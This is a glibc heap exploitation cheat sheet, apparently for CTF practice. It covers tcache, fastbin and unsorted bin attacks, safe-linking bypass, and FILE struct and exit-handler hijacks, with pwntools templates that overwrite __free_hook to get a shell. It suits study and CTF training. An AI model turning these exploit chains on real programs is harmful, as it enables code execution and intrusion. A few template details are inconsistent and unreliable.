# Heap Exploitation (Heap Pwn)

## glibc Version Differences (Must Read)

All heap exploitation techniques are tightly bound to the glibc version. Confirm the version first:

```bash
./libc.so.6 | head -1
# GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31.

# or strings
strings ./libc.so.6 | grep "GNU C Library"
```

| glibc Version | Key Change | Impact |
|-----------|---------|------|
| 2.26 and earlier | No tcache | unsorted/fastbin is the main battleground |
| 2.27 | **tcache introduced** | tcache poisoning becomes trivially easy |
| 2.29 | unsorted bin unlink hardening (chunk size checks) | unsorted bin attack cut off |
| 2.31 | Multiple tcache checks (key field) | tcache poisoning slightly more complex |
| 2.32 | **safe-linking** (fd pointer XORed with PROTECT_PTR) | Must leak the heap base first |
| 2.34 | **__free_hook / __malloc_hook removed** | Pivot to FILE struct / exit handlers |
| 2.35+ | Further hardening | Same as 2.34, the FILE path still works |

## tcache poisoning (2.27 - 2.31)

### Principle

tcache is a per-thread cache with one linked list per size class, singly linked (fd only).
Before 2.29, the double-free check only looked at whether the head of the list was itself, without walking the list.

### Exploitation Template (2.27 - 2.31)

```python
from pwn import *

p = process('./vuln')
libc = ELF('./libc.so.6')

def add(idx, size, data=b'a'):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx: ', str(idx).encode())
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())
    return p.recvline().strip()

# === Step 1: leak libc base ===
# Allocate chunks beyond the tcache range (>0x408), free into unsorted bin, leftover main_arena pointer
for i in range(8):
    add(i, 0x80)
add(8, 0x80)  # prevent consolidation
for i in range(7):
    free(i)
free(7)       # the 8th goes into unsorted bin, fd/bk point to main_arena+96
add(9, 0x80)  # split part of it back, preserving fd
leak = u64(show(9).ljust(8, b'\x00'))
libc.address = leak - 0x3ebca0  # main_arena+96 offset, glibc 2.27 amd64
log.success(f'libc = {hex(libc.address)}')

# === Step 2: tcache poisoning → write __free_hook ===
add(10, 0x30)
add(11, 0x30)
free(10)
free(11)
# Use UAF to change chunk11's fd to point to __free_hook
edit(11, p64(libc.sym['__free_hook']))
add(12, 0x30)  # take out chunk11
add(13, 0x30, p64(libc.sym['system']))  # what comes out is the __free_hook address, write system

# Trigger: free a chunk whose content is "/bin/sh\x00"
add(14, 0x30, b'/bin/sh\x00')
free(14)

p.interactive()
```

## safe-linking Bypass (2.32+)

```text
Principle: the fd of tcache/fastbin is XORed with PROTECT_PTR when written:
    PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr

Bypass:
1. Must leak a heap address first (heap base)
2. Compute the obfuscated value: fake_fd_obf = (chunk_addr >> 12) ^ target
3. Write it in
```

```python
def protect_ptr(pos, ptr):
    return (pos >> 12) ^ ptr

# leak heap base (unsorted bin leftover / tcache fd leftover)
heap_base = leaked_heap & ~0xfff

# poisoning
fake_fd = protect_ptr(heap_base + chunk_off, target_addr)
edit(chunk_id, p64(fake_fd))
```

## fastbin attack (classic, mainly 2.26 and earlier)

```text
Key points:
1. fastbin is a singly linked list (fd only), no size checks except that the chunk size must match
2. After 2.27, tcache takes priority; fastbin is only used once tcache is full
3. You still need to forge memory that looks like a chunk (size field = real chunk size, ± a bit)
```

```python
# double free
add(0, 0x60)
add(1, 0x60)
free(0)
free(1)
free(0)  # fastbin: 0 → 1 → 0

# Change fd to a fake chunk (requires the size bytes at fake_addr + 8 to match 0x70)
add(2, 0x60, p64(fake_addr))
add(3, 0x60)
add(4, 0x60)  # take out the chunk at fake_addr
```

## unsorted bin attack (only 2.28 and earlier)

```text
Principle: write main_arena+88 to an arbitrary address
From 2.29 onward, a bck->fd == victim check was added, cannot be bypassed
Use: overwrite global_max_fast so small chunks also go through fastbin → combine with fastbin attack
```

```python
# Allocate unsorted-size chunks
add(0, 0x100)
add(1, 0x100)  # prevent top consolidation
free(0)
# UAF: change bk pointer to target - 0x10
edit(0, p64(0) + p64(target - 0x10))
add(2, 0x100)  # take out from unsorted → unlink → main_arena+88 written to target
```

## large bin attack

```text
Principle: large bin has an extra layer of fd_nextsize / bk_nextsize over unsorted
2.32 also added chunk size checks, but it still works for overwriting global_max_fast, _IO_list_all, etc.
An advanced technique, often used in combos like House of Husk
```

## House of XXX Quick Reference

| Name | Applicable Versions | Core Idea |
|------|---------|---------|
| House of Force | 2.28 and earlier | Overwrite top chunk size with a huge value → malloc at an arbitrary address |
| House of Lore | All versions | Forge a small bin list → return an arbitrary address |
| House of Orange | 2.23-2.30 | unsorted attack overwrites _IO_list_all to trigger _IO_flush_all_lockp |
| House of Roman | 2.23-2.26 | 12-bit brute force + fastbin attack to __malloc_hook |
| House of Einherjar | All versions | Forge prev_size + PREV_INUSE=0 → backward consolidation |
| House of Botcake | 2.27+ | tcache + unsorted bin combination, bypasses the tcache double-free check |
| House of Husk | 2.27+ | Overwrite printf's hook table (__printf_function_table) |
| House of Cat | 2.34+ | _IO_wfile_seekoff vtable exploitation, targeting hook-less versions |
| House of Apple | 2.34+ | _IO_wfile_jumps + setcontext gadget |

## Real-World Exploitation Steps (Generic 4 Steps)

```text
Step 1: leak heap base
  - Allocate a chunk → free into tcache (2.32+ keeps the obfuscated fd) → show → derive heap
  - Or: allocate a large chunk → free into unsorted → split back → show fd

Step 2: leak libc base
  - Free a large chunk into unsorted bin, fd/bk leave behind a main_arena address
  - show → leak → libc.address = leak - main_arena_offset

Step 3: Control IP
  - 2.27-2.33: tcache/fastbin poisoning → write __free_hook or __malloc_hook
  - 2.34+: FILE struct attack (_IO_2_1_stdout_ / stderr), overwrite vtable → _IO_wfile_jumps
  - Or: hijack exit handlers (__exit_funcs / tls_dtor_list)

Step 4: getshell
  - free_hook = system, free("/bin/sh") → shell
  - 2.34+: setcontext + 53 gadget → rop chain in heap → execve
```

## Alternative Paths After libc 2.34+ Removed Hooks

### FILE struct Attack (_IO_2_1_stdout_ / _IO_2_1_stderr_)

```text
Goal: when the program calls puts/printf, it eventually reaches _IO_file_xsputn → _IO_OVERFLOW → vtable call
Hijack:
  1. Overwrite _IO_2_1_stderr_'s vtable pointer to point to a forged vtable
  2. Forge the vtable so the __overflow field points to system or setcontext
  3. Make the first 8 bytes of fp (FILE*) itself be "/bin/sh\x00" (as system's rdi)
Trigger: any puts/printf/abort/exit flushes stderr
```

### Exit handlers (`__exit_funcs` / `tls_dtor_list`)

```text
Principle: __run_exit_handlers walks the __exit_funcs list, calling each dtor
Hijack: change a list node's func pointer to system, arg to "/bin/sh"
Note: 2.34+ added PTR_DEMANGLE, need to leak the fs:[0x30] guard value in tls to forge
```

### tls_dtor_list (more modern)

```text
__call_tls_dtors walks it, similar structure, also has to bypass PTR_DEMANGLE
Applies: runs on program exit, more universal than the FILE attack
```

## pwndbg / GEF Heap Debugging Commands

```text
# pwndbg
heap              # show all chunks in the current arena
bins              # show tcache / fastbin / unsorted / small / large bins
tcache            # look at tcache alone
find_fake_fast <addr> <size>  # find an fd write target usable as a fake chunk
vis_heap_chunks   # visualize the heap layout

# GEF
heap chunks
heap bins fast
heap bins tcache
heap chunk <addr>
```

## Typical pwntools Template (heap menu challenge)

```python
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

p = process('./vuln') if not args.REMOTE else remote('host', 1337)

# IO wrappers
def menu(choice):
    p.sendlineafter(b'choice:', str(choice).encode())

def add(idx, size, data=b'\n'):
    menu(1)
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendlineafter(b'size:', str(size).encode())
    if data != b'\n':
        p.sendafter(b'data:', data)

def free(idx):
    menu(2)
    p.sendlineafter(b'idx:', str(idx).encode())

def show(idx):
    menu(3)
    p.sendlineafter(b'idx:', str(idx).encode())
    return p.recvline().strip()

def edit(idx, data):
    menu(4)
    p.sendlineafter(b'idx:', str(idx).encode())
    p.sendafter(b'data:', data)

# === Afterwards, choose the technique stack based on the vulnerability type ===
```

## Notes

- **The glibc version is the first-order question** — the same binary with a 2.27 libc versus a 2.34 libc has completely different exploitation paths
- **tcache capacity = 7** (per size class) — you must spray 7 before overflow into unsorted/fastbin
- **chunk size = user request + 0x10 header, aligned to 0x10** (excluding the 0x10 header, you can actually write 0x8 beyond because the next chunk's prev_size is reused)
- **Remote heap spraying is unstable** — with a fork-model server, brk/mmap may differ per connection, do randomized testing
- **Do not leave unsorted leftovers in the attack chain** — a main_arena pointer appearing in an unexpected chunk will garble subsequent show output
- **safe-linking error rate** — when computing PROTECT_PTR, remember it is `pos >> 12`, where pos is the address being written to, not the address being pointed to
